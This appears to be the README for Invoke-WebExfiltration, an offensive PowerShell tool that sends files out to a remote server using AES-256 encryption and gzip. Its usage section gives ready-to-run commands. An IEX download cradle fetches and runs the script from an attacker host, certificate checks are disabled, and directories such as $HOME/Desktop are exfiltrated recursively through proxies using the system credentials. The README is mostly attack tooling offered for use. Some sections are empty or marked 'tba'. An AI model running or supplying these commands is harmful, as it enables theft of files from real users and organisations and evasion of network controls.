# Invoke-WebExfiltration
Exfiltrate data via PowerShell HTTP(s) POST request (with file gzip compression and AES-256 encryption)

Exfiltrate files to a remote server in a secure, encrypted way


# Description

# Features



# Technical details / design thoughts

- File encryption
  - File names and file content is encrypted with AES-256
  - Key size: 256 bit, block size: 128 bit, IV: 128 bit, PKCS7 padding
  - The password is SHA256 hashed to receive a 256 bit long key
  - This means that it is even safe to transfer files via plain text HTTP (assuming you use a strong password)

- Gzip compression
  - After encryption the binary data is compressed via Gzip.
  - It's quick for not too large files and reduces the size by a good few percent

- No password protection for file upload
  - The server will only accept data from POST requests which it can successfully decrypt. 
  - It tests that first on the file name.
  - If the content can't be decrypted the file name the file binary will be ignored and is discarded.
  - I kind of see that as a password protection 'light' for the file upload to prevent unwanted uploads from 3rd parties.

- Loot folder structure
  - The tool keeps the identical folder structure as it exists on the client

- No direct proxy support
  - The tools has no direct proxy support as there are too many scenarios 
  - This should rather be setup in the current PowerShell session. 
  - See examples on how to do that

# ToDo:
- I'm unhappy with the way SSL/HTTPS is done. Needs improvement
- 


# Limitations
- Large files (100MB) should be split into chunks and then exfiltrated (see examples)

# Help
```bash
...
```


# Installation

## Linux
```bash
git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
cd Invoke-WebExfiltration
pip3 install virtualenv
virtualenv -p python3 venv
source venv/bin/active
pip install -r requirements.txt
```

## Windows
```powershell
git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
cd Invoke-WebExfiltration

pip3.exe install virtualenv
virtualenv.exe -p python3 venv
.\venv\Scripts\activate.ps1

pip install -r requirements.txt
```

# Usage & Examples

```bash


```


## Load `IWE` into PowerShell 

HTTP
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://hackerman1337.net:8000/iwe')
```

HTTPS
```powershell
# Load via WebClient and certificate validation bypass. Does not work in pwsh.exe
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')

# Load via Invoke-WebRequest
IWR 'https://hackerman1337.net/iwe' | IEX

# Load via Invoke-WebRequest and certificate validation bypass
IWR 'https://hackerman1337.net/iwe' -SkipCertificateCheck | IEX
```

## Exfiltrate files

```powershell
# Exfiltrate single file
IWE -File .\file.bin

# Exfiltrate all files in current folder
ls | IWE

# Exfiltrate all files in curent dir starting with 
ls file* | IWE

# Exfiltrate all files and sub directories 
ls -Recurse * | IWE
```

## Load & use `IWE` with proxy 
Different proxy setup might be required depending on proxy authentication (NTLM, Kerberos, Basic Auth.)

1. Use system or custom proxy
2. Set proxy for current PowerShell session
3. Decide which proxy credentials to use (skip if no authentication is needed)
4. Decide if x509 certificate errors should be ignored
5. Use IWE as usual 
```powershell
# Set a proxy for the current PowerShell session

# 1. User system proxy
$proxyUri = New-Object System.Uri(([System.Net.WebProxy]::GetDefaultProxy()).Address.AbsoluteUri)
# 1. User custom proxy
$proxyUri = "http://yourProxy:8080"

# 2. Set the default web proxy all request in current PowerShell session
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($proxyUri, $true)

# 3. Use system default credentials (e.g. vor NTLM / Kerberos)
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

# 3. Use custom credentials for proxy (e.g. Basic Auth)
[System.Net.WebRequest]::DefaultWebProxy.Credentials = Get-Credential

# 4. Ignore certificate check (needed if self signed certificate is used)
# Does not work in pwsh.exe, use powershell.exe!
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# 5. Use IWE as usual
IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')
ls $HOME/Desktop | IWE
```


## Exfiltrate large files (split into chunks)
Large files (>100MB) should be split into smaller chunks.
```powershell
tba.
```

